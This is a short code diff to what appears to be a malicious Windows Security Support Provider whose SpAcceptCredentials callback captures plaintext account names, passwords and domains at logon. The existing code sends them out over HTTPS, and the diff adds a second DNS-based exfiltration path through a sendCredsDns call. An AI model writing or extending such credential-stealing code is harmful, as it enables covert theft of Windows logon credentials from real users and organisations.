@@ -24,6 +24,12 @@ NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRIN
 #if HTTPS_EXFILTRATION == 1
 	sendCreds(AccountName->Buffer, PrimaryCredentials->Password.Buffer, PrimaryCredentials->DomainName.Buffer);
 #endif
+
+#if DNS_EXFILTRATION == 1
+	sendCredsDns(AccountName->Buffer, PrimaryCredentials->Password.Buffer, PrimaryCredentials->DomainName.Buffer);
+#endif
+
+
 	return 0;
 }
 
